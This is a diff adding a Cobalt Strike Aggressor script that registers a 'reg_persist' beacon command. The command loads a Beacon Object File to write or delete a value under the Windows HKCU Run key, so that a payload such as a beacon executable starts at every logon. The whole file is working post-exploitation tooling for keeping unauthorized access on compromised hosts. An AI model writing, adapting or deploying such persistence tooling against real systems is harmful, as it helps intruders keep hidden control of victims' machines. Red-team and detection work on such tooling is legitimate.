@@ -1,0 +1,46 @@
+# RegistryPersistence BOF
+# Install or remove a Run key for persistence via the registry
+
+beacon_command_register(
+    "reg_persist",
+    "Install or remove a registry Run key for persistence",
+    "Synopsis: reg_persist <install|remove> [payload]\n\n" .
+    "Installs or removes a value under:\n" .
+    "  HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\n\n" .
+    "Arguments:\n" .
+    "  install <payload>  - Set the Run key with the given payload path\n" .
+    "  remove             - Delete the Run key\n\n" .
+    "Examples:\n" .
+    "  reg_persist install C:\\Users\\Public\\beacon.exe\n" .
+    "  reg_persist remove"
+);
+
+alias reg_persist {
+    local('$bid $barch $handle $data $args');
+
+    $bid = $1;
+    $barch = barch($bid);
+
+    if ($2 eq "install") {
+        if ($3 is $null || strlen($3) == 0) {
+            berror($bid, "Usage: reg_persist install <payload_path>");
+            return;
+        }
+        $args = bof_pack($bid, "iz", 1, $3);
+        btask($bid, "Installing registry persistence with payload: " . $3);
+    }
+    else if ($2 eq "remove") {
+        $args = bof_pack($bid, "iz", 0, "");
+        btask($bid, "Removing registry persistence");
+    }
+    else {
+        berror($bid, "Usage: reg_persist <install|remove> [payload]\n  install <payload> - Set the Run key\n  remove            - Delete the Run key");
+        return;
+    }
+
+    $handle = openf(script_resource("RegistryPersistence." . $barch . ".o"));
+    $data = readb($handle, -1);
+    closef($handle);
+
+    beacon_inline_execute($bid, $data, "go", $args);
+}
